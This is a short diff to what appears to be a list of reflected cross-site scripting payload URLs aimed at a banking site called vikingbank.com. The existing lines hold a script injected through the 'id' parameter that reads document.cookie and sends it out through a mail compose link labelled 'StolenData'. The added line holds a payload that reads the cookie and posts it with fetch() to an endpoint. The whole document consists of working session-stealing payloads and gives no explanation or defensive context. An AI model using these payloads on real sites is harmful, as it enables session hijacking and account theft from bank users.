@@ -11,3 +11,7 @@ https://vikingbank.com/transaction?id=2%22%3E%3Cscript%3EuseSimpleMode()%3C/scri
 
 
 https://vikingbank.com/transaction?id=2%22%3E%3Cscript%3Evar%20stolenData%20=%20document.cookie;%20var%20emailBody%20=%20encodeURIComponent('Session%20data:%20'+stolenData);%20window.location.href='Mail.viking.com/mail/u/0/?compose=new&body='+emailBody+'&subject=StolenData';%3C/script%3E
+
+
+
+https://vikingbank.com/transaction?id=2%22%3E%3Cscript%3Evar%20stolenCookie%20=%20document.cookie;%20fetch('https://vikingbank.com/special-endpoint?cookie='+encodeURIComponent(stolenCookie));%3C/script%3E
